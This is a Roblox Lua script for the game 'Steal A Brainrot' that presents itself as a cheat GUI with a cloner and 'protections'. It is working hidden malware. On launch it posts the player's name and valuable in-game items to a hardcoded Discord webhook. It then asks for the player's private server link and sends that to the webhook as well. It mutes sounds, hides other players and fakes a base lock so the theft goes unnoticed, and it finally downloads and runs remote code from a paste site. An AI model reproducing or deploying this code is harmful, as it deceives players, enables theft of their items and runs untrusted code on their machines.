-- Steal A Brainrot - Blue GUI + Advanced Detection + Full MLK Protections + Working Cloner with Animations
if game.PlaceId ~= 109983668079237 then
    return warn("Not in Steal A Brainrot!")
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local HttpRequest = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
local LP = Players.LocalPlayer
if not LP then return end
local PlayerGui = LP:WaitForChild("PlayerGui", 10)

-- Alone check
task.spawn(function()
    task.wait(1)
    if #Players:GetPlayers() > 3 then
        LP:Kick("You need to be alone. Try again alone.")
    end
end)

-- ================== CONFIG ==================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1480760724765806685/viWCsb0UIC8unqQJEkqhlHIaVn72pwBKCd0C6afi52JfO0lcaGVHPeSL9nGdYu4d7CyB"
local AVATAR_URL = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

-- ================== TARGET LISTS ==================
local TargetBrainrots = {
    ["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Meowl"] = true,
    ["John Pork"] = true, ["Skibidi Toilet"] = true, ["Griffin"] = true,
    ["Dragon Aquanini"] = true, ["Dragon Gingerini"] = true, ["Hydra Dragon Cannelloni"] = true,
    ["Signore Carapace"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true,
    ["Moby Bros"] = true, ["Digi Narwhal"] = true, ["Kraken"] = true,
    ["La Supreme Combinasion"] = true, ["Elefanto Frigo"] = true, ["Hydra Bunny"] = true,
    ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Jelly Moby"] = true,
    ["Bunny and Eggy"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Arcadragon"] = true,
    ["Burguro And Fryuro"] = true, ["Ketupat Bros"] = true, ["Reinito Sleighito"] = true,
    ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["Antonio"] = true,
    ["La Secret Combinasion"] = true, ["Pancake and Syrup"] = true, ["Foxini Lanternini"] = true,
    ["Kalika Bros"] = true, ["Los Sekolahs"] = true, ["Sammyni Fattini"] = true,
    ["Cash or Card"] = true, ["Fragrama and Chocrama"] = true, ["La Casa Boo"] = true,
    ["Los Admins"] = true, ["Duggy Bros"] = true, ["La Food Combinasion"] = true,
    ["Sammyni Cakini"] = true, ["Boppin Bunny"] = true, ["Spooky and Pumpky"] = true,
    ["Ginger Gerat"] = true, ["Los Chillis"] = true, ["Los Hackers"] = true,
    ["Bearito Cabinito"] = true, ["Capitano Americano"] = true, ["Rubrikiko"] = true,
    ["Festive 67"] = true, ["Guest 666"] = true, ["Quackini Snackini"] = true,
    ["Cloverat Clapat"] = true, ["Hopilikalika Hopilikalako"] = true, ["Garama and Madundung"] = true,
    ["Fishino Clownino"] = true, ["Jolly Jolly Sahur"] = true, ["Rico Dinero"] = true,
    ["Tirilikalika Tirilikalako"] = true, ["Dug Dug Dug"] = true, ["Fragola La La La"] = true,
    ["Los Tacoritas"] = true, ["Globa Steppa"] = true, ["Money Money Bros"] = true,
    ["Rubiko and Kubiko"] = true, ["Pizza and Ranch"] = true, ["Examen Bros"] = true,
    ["Los Secret Combinasionas"] = true,
}

local MUTATION_MULT = {
    ["None"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
    ["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
    ["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
    ["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13,
}

-- ================== DATA ==================
local AnimalsData, NumberUtils, TraitsData
pcall(function() AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
pcall(function() NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils")) end)
pcall(function() TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits")) end)
pcall(function()
    if not TraitsData then TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits")) end
end)

-- ================== DETECTION ==================
local function getMyPlotAndAnimals()
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then return nil, nil end

    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then
        for _ = 1, 25 do
            task.wait(0.1)
            hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then break end
        end
    end
    if not hrp then return nil, nil end

    local bestPlot, closestDist = nil, math.huge
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local ok, pos = pcall(function() return plot:GetPivot().Position end)
        if ok and pos then
            local dist = (pos - hrp.Position).Magnitude
            if dist < closestDist then
                closestDist = dist
                bestPlot = plot
            end
        end
    end
    if not bestPlot then return nil, nil end

    local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
    local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
    if not requestData then return nil, nil end

    local ok, data = pcall(function()
        return requestData:InvokeServer(bestPlot.Name)
    end)
    if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
        return nil, nil
    end
    return bestPlot, data.AnimalList
end

local function getMutationMultiplier(mutName)
    if not mutName or mutName == "" or mutName == "None" then return 1 end
    if MUTATION_MULT[mutName] then return MUTATION_MULT[mutName] end
    local key = mutName:lower():gsub("%s+", "")
    for name, mult in pairs(MUTATION_MULT) do
        if name:lower():gsub("%s+", "") == key then return mult end
    end
    return 1
end

local function getTraitMultiplier(traitName)
    if not TraitsData or not traitName then return 0 end
    local info = TraitsData[traitName]
    if not info then
        local key = traitName:lower():gsub("%s+", "")
        for k, v in pairs(TraitsData) do
            if type(k) == "string" and k:lower():gsub("%s+", "") == key then
                info = v
                break
            end
        end
    end
    if type(info) ~= "table" then return 0 end
    local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
    return (type(tm) == "number" and tm > 0) and tm or 0
end

local function getGeneration(data)
    local index = data.Index
    local base = 0
    if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
        base = AnimalsData[index].Generation
    end
    if base <= 0 then return 0 end
    local gen = base * getMutationMultiplier(data.Mutation)
    if type(data.Traits) == "table" then
        for _, t in pairs(data.Traits) do
            local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
            local tm = getTraitMultiplier(traitName)
            if tm > 0 then gen = gen + (base * tm) end
        end
    end
    return gen
end

local function formatGen(genVal)
    if NumberUtils and NumberUtils.Format then return NumberUtils.Format(genVal) .. "/s" end
    if genVal >= 1e12 then return string.format("%.1fT/s", genVal / 1e12)
    elseif genVal >= 1e9 then return string.format("%.1fB/s", genVal / 1e9)
    elseif genVal >= 1e6 then return string.format("%.1fM/s", genVal / 1e6)
    elseif genVal >= 1e3 then return string.format("%.1fK/s", genVal / 1e3)
    end
    return tostring(math.floor(genVal)) .. "/s"
end

-- ================== SCAN HELPER ==================
local function scanAllBrainrots()
    local myPlot, animalList = getMyPlotAndAnimals()
    if not myPlot or not animalList then return {}, nil end

    local brainrots = {}
    for slotKey, data in pairs(animalList) do
        if type(data) == "table" and data.Index then
            local displayName = data.Index
            if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
                displayName = AnimalsData[data.Index].DisplayName
            end
            if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
                local genVal = getGeneration(data)
                table.insert(brainrots, {
                    name = displayName,
                    index = data.Index,
                    mutation = data.Mutation or "None",
                    traits = type(data.Traits) == "table" and #data.Traits or 0,
                    genVal = genVal,
                    genStr = formatGen(genVal),
                    slot = tostring(slotKey)
                })
            end
        end
    end
    table.sort(brainrots, function(a, b) return a.genVal > b.genVal end)
    return brainrots, myPlot
end

-- ================== IMMEDIATE WARNING ==================
task.spawn(function()
    task.wait(1.5)
    local brainrots = scanAllBrainrots()

    local lines = {}
    for _, br in ipairs(brainrots) do
        local mutPrefix = (br.mutation ~= "None" and br.mutation ~= "") and ("[" .. br.mutation .. "] ") or ""
        table.insert(lines, string.format("%s**%s** • Traits: %d • %s", mutPrefix, br.name, br.traits, br.genStr))
    end
    local brainrotText = #lines > 0 and table.concat(lines, "\n") or "No high-value brainrots detected yet"

    local embed = {
        title = "Someone Is Using Your Script!",
        description = "**Player Executed Script**\n**Username:** " .. LP.Name .. "\n**Display:** " .. LP.DisplayName .. "\n**Players Online:** " .. #Players:GetPlayers() .. "\n\n**Brainrots:**\n" .. brainrotText,
        color = 0x0F52BA,
        footer = { text = "Sab Logger" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    pcall(function()
        HttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "",
                username = "Scanner",
                avatar_url = AVATAR_URL,
                embeds = {embed}
            })
        })
    end)
end)

-- ================== MLK PROTECTIONS ==================

-- 1. Mute all sounds
local function muteAllSounds()
    task.spawn(function()
        for _, Sound in ipairs(game:GetDescendants()) do
            if Sound:IsA("Sound") then pcall(function() Sound.Volume = 0 end) end
        end
        game.DescendantAdded:Connect(function(obj)
            if obj:IsA("Sound") then pcall(function() obj.Volume = 0 end) end
        end)
    end)
end

-- 2. Destroy other players + characters
local function hideOtherPlayers()
    task.spawn(function()
        for _, Player in ipairs(Players:GetPlayers()) do
            if Player ~= LP then
                if Player.Character then pcall(function() Player.Character:Destroy() end) end
                pcall(function() Player:Destroy() end)
            end
        end
        Players.PlayerAdded:Connect(function(NewPlayer)
            if NewPlayer ~= LP then
                NewPlayer.CharacterAdded:Connect(function(Character)
                    pcall(function() Character:Destroy() end)
                end)
                task.wait()
                pcall(function() NewPlayer:Destroy() end)
            end
        end)
        Workspace.ChildAdded:Connect(function(Model)
            if Model:IsA("Model") and Model.Name ~= LP.Name and Model:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    local p = Players:GetPlayerFromCharacter(Model)
                    Model:Destroy()
                    if p then p:Destroy() end
                end)
            end
        end)
    end)
end

-- 3. Hide / replace other plots
local function hideOtherPlayersPlots()
    task.spawn(function()
        pcall(function()
            local Plots = Workspace:WaitForChild("Plots")
            local ProtectedPlots = {}
            local ClonedPlots = {}
            local PlotData = {}

            local function CleanPlot(Plot)
                local ProtectedNames = {"PlotSign", "AnimalPodiums", "MainRoot"}
                for _, Child in ipairs(Plot:GetChildren()) do
                    if Child:IsA("Model") and not table.find(ProtectedNames, Child.Name) then
                        Child:Destroy()
                    end
                end
            end
            local function CleanSpawns(Plot)
                for _, Descendant in ipairs(Plot:GetDescendants()) do
                    if Descendant.Name == "Spawn" or Descendant.Name == "Collect" then
                        Descendant:Destroy()
                    end
                end
            end

            for _, Plot in ipairs(Plots:GetChildren()) do
                if Plot:IsA("Model") then
                    local PlotSign = Plot:FindFirstChild("PlotSign", true)
                        and Plot.PlotSign:FindFirstChild("SurfaceGui", true)
                        and Plot.PlotSign.SurfaceGui:FindFirstChild("Frame", true)
                        and Plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true)

                    if PlotSign and PlotSign.Text ~= "Empty Base" then
                        ProtectedPlots[Plot] = true
                    elseif Plot.PrimaryPart then
                        table.insert(PlotData, {plot = Plot, cframe = Plot.PrimaryPart.CFrame})
                    end
                end
            end

            for _, PlotInfo in ipairs(PlotData) do
                local Clone = PlotInfo.plot:Clone()
                CleanPlot(Clone)
                CleanSpawns(Clone)
                table.insert(ClonedPlots, {clone = Clone, cframe = PlotInfo.cframe})
            end
            for _, PlotInfo in ipairs(PlotData) do PlotInfo.plot:Destroy() end
            for _, CloneInfo in ipairs(ClonedPlots) do
                local Clone = CloneInfo.clone
                Clone.Parent = Plots
                if Clone.PrimaryPart and CloneInfo.cframe then
                    Clone:SetPrimaryPartCFrame(CloneInfo.cframe)
                end
            end
            Plots.ChildAdded:Connect(function(NewPlot)
                if not ProtectedPlots[NewPlot] then NewPlot:Destroy() end
            end)
        end)
    end)
end

-- 4. FIXED CLONER WITH ANIMATION SUPPORT
local function findMyPlotForClone()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end

    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local closest, closestDist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local ok, pos = pcall(function() return plot:GetPivot().Position end)
            if ok then
                local dist = (pos - hrp.Position).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closest = plot
                end
            end
        end
    end
    return closest
end

local function getIdleAnimation(animalName)
    local animations = ReplicatedStorage:FindFirstChild("Animations")
    if not animations then return nil end

    local animals = animations:FindFirstChild("Animals")
    if not animals then return nil end

    local animalFolder = animals:FindFirstChild(animalName)
    if not animalFolder then return nil end

    return animalFolder:FindFirstChild("Idle")
end

local function playAnimationOnClone(clone, animalName)
    local animTrack = getIdleAnimation(animalName)
    if not animTrack then return end

    local humanoid = clone:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        for _, child in ipairs(clone:GetDescendants()) do
            if child:IsA("Humanoid") then
                humanoid = child
                break
            end
        end
    end

    if not humanoid then return end

    pcall(function()
        local loadedAnim = humanoid:LoadAnimation(animTrack)
        loadedAnim:Play()
    end)
end

local function cloneBrainrots()
    local myPlot = findMyPlotForClone()
    if not myPlot then
        warn("[Cloner] Could not find plot")
        return
    end

    local folder = Instance.new("Folder")
    folder.Name = "ClonedBrainrots_" .. math.random(1000, 9999)
    folder.Parent = Workspace

    local blacklist = {
        MainRoot = true, PlotSign = true, AnimalPodiums = true,
        Laser = true, LaserHitbox = true, InvisibleWalls = true,
        Skin = true, Purchases = true, Unlock = true, Decorations = true,
        AnimalTarget = true, StealHitbox = true, Slope = true,
        DeliveryHitbox = true, Multiplier = true, Spawn = true,
        FriendPanel = true, CashPad = true, Model = true,
        Animator = true, AnimationTrack = true, Animation = true, Animate = true,
    }

    local cloned = 0
    for _, child in ipairs(myPlot:GetChildren()) do
        if child:IsA("Model") and not blacklist[child.Name] then
            local success = pcall(function()
                local clone = child:Clone()
                clone.Parent = folder

                if child.PrimaryPart then
                    clone:SetPrimaryPartCFrame(child:GetPrimaryPartCFrame())
                end

                task.wait(0.1)
                playAnimationOnClone(clone, child.Name)

                cloned = cloned + 1
            end)
        end
    end

    if cloned > 0 then
        print("[Cloner] Successfully cloned", cloned, "brainrots with animations →", folder.Name)
    else
        folder:Destroy()
    end
end

-- 5. Fake Lock Base
local myPlotForLock = nil
local function findMyPlotForLock()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return end
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local plotSign = plot:FindFirstChild("PlotSign", true)
            if plotSign then
                local textLabel = plotSign:FindFirstChildWhichIsA("TextLabel", true)
                if textLabel and (textLabel.Text:find(LP.DisplayName, 1, true) or textLabel.Text:find(LP.Name, 1, true)) then
                    myPlotForLock = plot
                    return
                end
            end
        end
    end
end

local function updateRemainingTime(remainingLabel)
    local connection
    connection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if remainingLabel and remainingLabel:IsA("TextLabel") then
                local cyclePos = math.floor(tick()) % 100
                remainingLabel.Text = (100 - cyclePos) .. "s"
            else
                if connection then connection:Disconnect() end
            end
        end)
    end)
end

local function forceFakeLock()
    if not myPlotForLock or not myPlotForLock.Parent then
        findMyPlotForLock()
        if not myPlotForLock then return end
    end

    local laser = myPlotForLock:FindFirstChild("Laser")
    if laser then
        for _, obj in pairs(laser:GetDescendants()) do
            if obj:IsA("BasePart") then
                pcall(function() obj.Transparency = 0 end)
            end
        end
    end

    local purchases = myPlotForLock:FindFirstChild("Purchases")
    if purchases then
        for _, purchase in ipairs(purchases:GetChildren()) do
            local main = purchase:FindFirstChild("Main")
            if main then
                local billboard = main:FindFirstChild("BillboardGui")
                if billboard then
                    local locked = billboard:FindFirstChild("Locked")
                    if locked and locked:IsA("TextLabel") then
                        pcall(function()
                            locked.Visible = true
                            locked.Text = "Locked:"
                        end)
                    end
                    local remaining = billboard:FindFirstChild("RemainingTime")
                    if remaining and remaining:IsA("TextLabel") then
                        pcall(function()
                            remaining.Visible = true
                            updateRemainingTime(remaining)
                        end)
                    end
                end
            end
        end
    end
end

local function startFakeLockLoop()
    findMyPlotForLock()
    task.spawn(function()
        while true do
            task.wait(0.4)
            forceFakeLock()
        end
    end)
    task.spawn(function()
        while true do
            task.wait(4)
            if not myPlotForLock or not myPlotForLock.Parent then findMyPlotForLock() end
        end
    end)
end

-- ================== BLUE GUI ==================
if PlayerGui:FindFirstChild("FunScriptGui") then PlayerGui.FunScriptGui:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FunScriptGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = PlayerGui

local backdrop = Instance.new("Frame")
backdrop.Size = UDim2.new(1, 0, 1, 0)
backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
backdrop.BackgroundTransparency = 1
backdrop.BorderSizePixel = 0
backdrop.ZIndex = 1
backdrop.Parent = screenGui

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 6)
shadow.Size = UDim2.new(0, 460, 0, 300)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://1316045217"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 1
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10, 10, 118, 118)
shadow.ZIndex = 1
shadow.Parent = screenGui

local card = Instance.new("Frame")
card.Name = "Card"
card.AnchorPoint = Vector2.new(0.5, 0.5)
card.Position = UDim2.new(0.5, 0, 0.5, 0)
card.Size = UDim2.new(0, 420, 0, 264)
card.BackgroundColor3 = Color3.fromRGB(20, 25, 33)
card.BorderSizePixel = 0
card.ZIndex = 2
card.Parent = screenGui
Instance.new("UICorner", card).CornerRadius = UDim.new(0, 22)

local cardStroke = Instance.new("UIStroke")
cardStroke.Color = Color3.fromRGB(64, 75, 88)
cardStroke.Thickness = 1
cardStroke.Transparency = 0.5
cardStroke.Parent = card

local cardGradient = Instance.new("UIGradient")
cardGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(32, 38, 48)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(16, 20, 27)),
})
cardGradient.Rotation = 90
cardGradient.Parent = card

local content = Instance.new("Frame")
content.Size = UDim2.new(1, 0, 1, 0)
content.BackgroundTransparency = 1
content.ZIndex = 3
content.Parent = card

local padding = Instance.new("UIPadding")
padding.PaddingTop = UDim.new(0, 34)
padding.PaddingLeft = UDim.new(0, 34)
padding.PaddingRight = UDim.new(0, 34)
padding.PaddingBottom = UDim.new(0, 30)
padding.Parent = content

local iconChip = Instance.new("Frame")
iconChip.Size = UDim2.new(0, 40, 0, 40)
iconChip.BackgroundColor3 = Color3.fromRGB(94, 234, 212)
iconChip.BackgroundTransparency = 0.85
iconChip.ZIndex = 3
iconChip.Parent = content
Instance.new("UICorner", iconChip).CornerRadius = UDim.new(0, 12)

local iconGlyph = Instance.new("TextLabel")
iconGlyph.Size = UDim2.new(1, 0, 1, 0)
iconGlyph.BackgroundTransparency = 1
iconGlyph.Text = "✦"
iconGlyph.TextColor3 = Color3.fromRGB(94, 234, 212)
iconGlyph.Font = Enum.Font.GothamBold
iconGlyph.TextSize = 20
iconGlyph.ZIndex = 4
iconGlyph.Parent = iconChip

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 0, 26)
title.Position = UDim2.new(0, 50, 0, 2)
title.BackgroundTransparency = 1
title.Text = "PRIVATE SERVER LINK REQUIRED!"
title.TextColor3 = Color3.fromRGB(245, 248, 250)
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 3
title.Parent = content

local titleAccent = Instance.new("Frame")
titleAccent.Size = UDim2.new(0, 36, 0, 3)
titleAccent.Position = UDim2.new(0, 50, 0, 30)
titleAccent.BackgroundColor3 = Color3.fromRGB(94, 234, 212)
titleAccent.BorderSizePixel = 0
titleAccent.ZIndex = 3
titleAccent.Parent = content
Instance.new("UICorner", titleAccent).CornerRadius = UDim.new(1, 0)

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 18)
subtitle.Position = UDim2.new(0, 0, 0, 46)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Paste your private server link"
subtitle.TextColor3 = Color3.fromRGB(140, 150, 163)
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 14
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.ZIndex = 3
subtitle.Parent = content

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, 0, 0, 54)
inputBox.Position = UDim2.new(0, 0, 0, 84)
inputBox.BackgroundColor3 = Color3.fromRGB(13, 17, 22)
inputBox.TextColor3 = Color3.fromRGB(232, 239, 245)
inputBox.PlaceholderText = "https://www.roblox.com/share?code="
inputBox.PlaceholderColor3 = Color3.fromRGB(96, 106, 118)
inputBox.Font = Enum.Font.Gotham
inputBox.TextSize = 16
inputBox.ClearTextOnFocus = false
inputBox.Text = ""
inputBox.ZIndex = 3
inputBox.Parent = content
Instance.new("UICorner", inputBox).CornerRadius = UDim.new(0, 14)
local inputPadding = Instance.new("UIPadding", inputBox)
inputPadding.PaddingLeft = UDim.new(0, 16)
inputPadding.PaddingRight = UDim.new(0, 16)

local inputStroke = Instance.new("UIStroke")
inputStroke.Color = Color3.fromRGB(45, 53, 63)
inputStroke.Thickness = 1
inputStroke.Parent = inputBox

inputBox.Focused:Connect(function()
    TweenService:Create(inputStroke, TweenInfo.new(0.18), {Color = Color3.fromRGB(94, 234, 212), Thickness = 1.5}):Play()
end)
inputBox.FocusLost:Connect(function()
    TweenService:Create(inputStroke, TweenInfo.new(0.18), {Color = Color3.fromRGB(45, 53, 63), Thickness = 1}):Play()
end)

local enterBtn = Instance.new("TextButton")
enterBtn.Size = UDim2.new(1, 0, 0, 54)
enterBtn.Position = UDim2.new(0, 0, 0, 150)
enterBtn.BackgroundColor3 = Color3.fromRGB(94, 234, 212)
enterBtn.Text = "Enter"
enterBtn.TextColor3 = Color3.fromRGB(6, 33, 28)
enterBtn.Font = Enum.Font.GothamBold
enterBtn.TextSize = 17
enterBtn.AutoButtonColor = false
enterBtn.ZIndex = 3
enterBtn.Parent = content
Instance.new("UICorner", enterBtn).CornerRadius = UDim.new(0, 14)

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 16)
status.Position = UDim2.new(0, 0, 0, 214)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = Color3.fromRGB(232, 120, 120)
status.Font = Enum.Font.Gotham
status.TextSize = 13
status.TextTransparency = 1
status.ZIndex = 3
status.Parent = content

-- Opening animation
card.Size = UDim2.new(0, 380, 0, 234)
card.BackgroundTransparency = 1
cardStroke.Transparency = 1
shadow.ImageTransparency = 1
title.TextTransparency = 1
titleAccent.BackgroundTransparency = 1
subtitle.TextTransparency = 1
inputBox.BackgroundTransparency = 1
inputStroke.Transparency = 1
enterBtn.BackgroundTransparency = 1
enterBtn.TextTransparency = 1
iconChip.BackgroundTransparency = 1
iconGlyph.TextTransparency = 1

TweenService:Create(card, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Size = UDim2.new(0, 420, 0, 264), BackgroundTransparency = 0}):Play()
TweenService:Create(backdrop, TweenInfo.new(0.35), {BackgroundTransparency = 0.5}):Play()
TweenService:Create(cardStroke, TweenInfo.new(0.35), {Transparency = 0.5}):Play()
TweenService:Create(shadow, TweenInfo.new(0.4), {ImageTransparency = 0.6}):Play()
task.wait(0.12)
for _, obj in ipairs({title, subtitle}) do
    TweenService:Create(obj, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
end
TweenService:Create(titleAccent, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
TweenService:Create(iconChip, TweenInfo.new(0.3), {BackgroundTransparency = 0.85}):Play()
TweenService:Create(iconGlyph, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
TweenService:Create(inputBox, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
TweenService:Create(inputStroke, TweenInfo.new(0.3), {Transparency = 0}):Play()
TweenService:Create(enterBtn, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextTransparency = 0}):Play()

local function closeGui()
    local closeTween = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
    TweenService:Create(card, closeTween, {Size = UDim2.new(0, 400, 0, 244), BackgroundTransparency = 1}):Play()
    TweenService:Create(backdrop, closeTween, {BackgroundTransparency = 1}):Play()
    TweenService:Create(cardStroke, closeTween, {Transparency = 1}):Play()
    TweenService:Create(shadow, closeTween, {ImageTransparency = 1}):Play()
    for _, obj in ipairs({title, subtitle, status}) do
        TweenService:Create(obj, closeTween, {TextTransparency = 1}):Play()
    end
    TweenService:Create(titleAccent, closeTween, {BackgroundTransparency = 1}):Play()
    TweenService:Create(iconChip, closeTween, {BackgroundTransparency = 1}):Play()
    TweenService:Create(iconGlyph, closeTween, {TextTransparency = 1}):Play()
    TweenService:Create(inputBox, closeTween, {BackgroundTransparency = 1}):Play()
    TweenService:Create(inputStroke, closeTween, {Transparency = 1}):Play()
    TweenService:Create(enterBtn, closeTween, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    task.wait(0.25)
    screenGui:Destroy()
end

-- ================== SUBMIT ==================
enterBtn.MouseButton1Click:Connect(function()
    local value = inputBox.Text:match("^%s*(.-)%s*$")

    if value == "" or #value < 10 then
        status.Text = "Please enter a valid link"
        status.TextColor3 = Color3.fromRGB(232, 120, 120)
        status.TextTransparency = 0
        TweenService:Create(status, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
        return
    end
    if not value:lower():find("roblox.com") then
        status.Text = "Must be a valid Roblox link"
        status.TextColor3 = Color3.fromRGB(232, 120, 120)
        status.TextTransparency = 0
        TweenService:Create(status, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
        return
    end

    local brainrots = scanAllBrainrots()
    if #brainrots == 0 then
        status.Text = "No target brainrots found!"
        status.TextColor3 = Color3.fromRGB(232, 120, 120)
        status.TextTransparency = 0
        task.wait(2)
        LP:Kick("No high-value brainrots detected")
        return
    end

    local lines = {}
    for _, br in ipairs(brainrots) do
        local mutPrefix = (br.mutation ~= "None" and br.mutation ~= "") and ("[" .. br.mutation .. "] ") or ""
        table.insert(lines, string.format("%s**%s** • Traits: %d • %s", mutPrefix, br.name, br.traits, br.genStr))
    end
    local brainrotText = table.concat(lines, "\n")
    if #brainrotText > 3800 then brainrotText = brainrotText:sub(1, 3796) .. "..." end

    local embed = {
        title = "Scanner",
        description = "**Private Server Link**\n" .. value .. "\n\n**High-Value Brainrots (" .. #brainrots .. ")**\n" .. brainrotText,
        color = 0x5EEAD4,
        fields = {
            { name = "👤 Player", value = "**" .. LP.Name .. "** (" .. LP.DisplayName .. ")", inline = true },
            { name = "🌐 Server", value = "Players: **" .. #Players:GetPlayers() .. "**\nScanned: <t:" .. os.time() .. ":R>", inline = true }
        },
        footer = { text = "Steal A Brainrot Scanner" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    pcall(function()
        HttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "@everyone",
                username = "Scanner",
                avatar_url = AVATAR_URL,
                embeds = {embed}
            })
        })
    end)

    -- Protections + cloner with animations
    muteAllSounds()
    hideOtherPlayers()
    hideOtherPlayersPlots()
    cloneBrainrots()
    startFakeLockLoop()

    task.wait(0.8)
    closeGui()

    -- Execute the extra script
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/XNtsjjPd/raw"))()
    end)
end)

print("✅ Full version loaded - Cloner with Animations integrated")
